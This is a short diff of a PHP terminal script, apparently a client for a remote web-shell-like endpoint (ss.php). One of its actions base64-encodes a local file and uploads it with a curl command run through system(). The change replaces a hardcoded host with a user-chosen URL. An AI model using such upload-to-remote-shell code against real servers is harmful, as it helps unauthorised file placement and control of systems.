@@ -168,7 +168,7 @@ elseif ($action == "4") {
     $fileData = file_get_contents($fpath);
     $fileData = base64_encode($fileData);
     echo $lblue."[i] Sending Request And Getting Response...\n\n$cln";
-    system("curl -s -F fileData=$fileData -F fileName=$fname -F file=@$fpath http://trellakart.com/ss.php?sscmd=u");
+    system("curl -s -F fileData=$fileData -F fileName=$fname -F file=@$fpath $selected1?sscmd=u");
     echo "\n\n\n$cln";
     echo "Press Enter To Continue\n\n";
     trim(fgets(STDIN,1024));
